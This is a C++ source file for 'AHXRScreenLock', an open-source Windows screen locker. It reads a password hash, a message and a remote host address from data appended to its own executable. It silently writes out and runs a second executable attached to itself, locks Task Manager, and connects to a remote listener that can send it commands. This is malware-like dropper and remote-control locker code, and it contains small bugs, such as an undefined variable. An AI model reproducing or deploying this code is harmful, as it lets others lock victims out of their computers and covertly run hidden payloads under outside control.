/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
//#define					DEBUG_MODE
#define						MINIMIZE_WINDOWS

static System::String ^		getMessage();

#ifdef DEBUG_MODE
	#include				"debug.h"
#endif

#include					"read_settings.h"
#include					"window_minimize.h"
#include					"sha256.h"
#include					"comparepw.h"
#include					"frmScreenLock.h"
#include					"handle_thread.h"
#include					"client_manage.h"
#include					"client_thread.h"
#include					"server_thread.h"
#include					"server_manage.h"
#include					"settings.h"

#include					<string>
#include					<fstream>
#include					<iostream>
#include					<msclr\marshal_cppstd.h>

using namespace				System;
using namespace				System::Windows::Forms;
using namespace				msclr::interop;

std::string 
							s_password,
							s_message,
							ss_server_host
;

[STAThread]
int main() {

#ifdef DEBUG_MODE
	packLocker(DUMMY_FILE, DUMMY_PASSWORD, DUMMY_MESSAGE, "127.0.0.1");
	attachExecutable(DUMMY_FILE, DUMMY_EXE);

	// Attempting to open and read own .exe file.
	std::ifstream
		f_exe(DUMMY_FILE, std::ios::binary);
#else
	// Attempting to open and read own .exe file.
	wchar_t
		szExeFileName[MAX_PATH];

	GetModuleFileName(NULL, szExeFileName, MAX_PATH);

	std::wstring
		ws(szExeFileName);

	std::string
		s_fetch_dir(ws.begin(), ws.end());

	std::ifstream
		f_exe(s_fetch_dir, std::ios::binary);
#endif

	if (f_exe.is_open()) {

		/*
			Since executables are so long. We're going to first find the length of the file.
			The password and message are stored at the end of the file. It wouldn't make sense
			for me to read through every single character just to find something.
		*/
#ifdef DEBUG_MODE
		std::ifstream
			f_exe_l(DUMMY_FILE, std::ios::binary);
#else
		std::ifstream
			f_exe_l(s_fetch_dir, std::ios::binary);
#endif

		std::streamoff is_length;
		int i_length;

		f_exe_l.seekg(0, std::ios::end); // Going to the end.
		is_length = f_exe_l.tellg(); // Length fetching.
		f_exe_l.close();

		i_length = static_cast<int>(is_length); // Data loss prevention.

		/*
			Going back to our .exe file and setting the starting reading spot.

			But that reading spot is at the END of the file. So we're going to start at
			the length of the file then go back just so we can read from point A to B.

			Finding how far we need to go back (due to exe attachments).
		*/
		char * c_search = new char[i_length];
		f_exe.read(c_search, i_length);

		std::string s_search(c_search, i_length);
		std::size_t t_first_open = 0;

		/*
			Whenever the file was packed, the password/message/attachment were split
			by 4 dashes. In previous versions (before .exe attachment), it made it extremely
			painful to find a starting search spot because the opener and closer symbols are
			common in an encrypted file.

			After debugging, it seems that .exe files have a bunch of symbols that show up consistently.
			Even if we read the file backwards, we wouldn't know the length of the attached .exe file.
			This is why we are reading the file from top to bottom, instead of bottom to top.

			This project (AHXRLocker), when compiled will write 3 (DEBUG) or 2 (RELEASE) different "----" in the .exe code.
			Since that is the case, I have to skip over those 2/3 to find the right 4 dashes that was used
			to separate the password/message/attachment.
		*/
#ifdef DEBUG_MODE
		for (unsigned int i = 0; i < 4; i++)
			t_first_open = s_search.find(PACK_SPLITTER, t_first_open + 3);
#else
		for (unsigned int i = 0; i < 2; i++)
			t_first_open = s_search.find(PACK_SPLITTER, t_first_open + 3);
#endif

		// Checking if there are any packs to begin with. If not: exit.
		if (t_first_open == std::string::npos)
			exit(0);

		f_exe.seekg(t_first_open); // Let's start reading from the REAL splitter now.

		// Obtaining the password hash.
		size_t t_pw_close = s_search.find(PACK_OPENER, t_first_open);
		s_password = s_search.substr(t_first_open + 5, PASSWORD_HASH_LENGTH); // Reading from start to 64 (SHA256 = 64 characters)

#ifdef DEBUG_MODE
		std::cout << s_password << "\r\n\r\n"; // Debugging the output.
#endif

		// Obtaining the message.
		size_t t_msg_open = s_search.find(PACK_OPENER, t_pw_close);
		size_t t_msg_close = s_search.find(PACK_CLOSER, t_msg_open);

		s_message = s_search.substr(t_msg_open + 1, t_msg_close - t_msg_open - 1); // Adjusting character positions.

#ifdef DEBUG_MODE
		std::cout << s_message << "\r\n\r\n"; // Debugging the output.
#endif

		// Obtaining the host.
		size_t t_host_open = s_search.find(PACK_OPENER, t_msg_close);
		size_t t_host_close = s_search.find(PACK_CLOSER, t_host_open);

		ss_server_host = s_search.substr(t_host_open + 1, t_host_close - t_host_open - 1); // Adjusting character positions.
		SET_HOST_ADDRESS((char *)ss_server_host.c_str());

#ifdef DEBUG_MODE
		std::cout << s_server_host << "\r\n\r\n"; // Debugging the output.
#endif

		std::cout << s_server_host << "\r\n\r\n"; // Debugging the output.

		// Obtaining the .exe attachment.
		size_t t_exe_open = s_search.find(PACK_OPENER, t_host_close);

		if (t_exe_open != std::string::npos) {
			f_exe.seekg(t_exe_open + 1); // Setting position to read the attached .exe
			
			std::string s_test = s_search.substr(t_exe_open, EOF);
			std::cout << s_test[1];

			char c_exe_read;
			std::fstream f_attach(ATTACH_FILE, std::ios::out | std::ios::binary);

			// Reading and writing the .exe to a new location.
			while (f_exe.get(c_exe_read))
				f_attach.put(c_exe_read);

			f_attach.close();

			/*
				Running the .exe file.

				I'm not going to bother checking and notifying if the process ran or not, otherwise it would void
				the whole point of the locker. If it runs, it runs, if not, oh well. The attached .exe will run
				until it's closed by itself.
			*/
			STARTUPINFO start_info = {
				sizeof(start_info)
			};
			CreateProcess(ATTACH_FILE, L"", 0, 0, 1, 0, 0, 0, &start_info, &proc_info);
			b_exe_attach = true;
		}
		f_exe.close();
		delete c_search;
	}
	else
		Application::Exit();

		START_SERVER_THREAD(); // Locking the program & taskmgr.

	if (ss_server_host.compare("0") != 0) {
		START_CLIENT_THREAD(); // Connect user to listener (if any)
		startServer(); // Server listening for commands.
	}

	// Running the form.
	Application::EnableVisualStyles();
	Application::SetCompatibleTextRenderingDefault(false);
	AHXRLocker::frmScreenLock frm;
	Application::Run(%frm);	
	
	// Safe socket clean-up.
	closesocket(ConnectSocket);
	WSACleanup();

	system("pause");
	return 0;
}

static String ^ getMessage() {
	return gcnew String(s_message.c_str());
}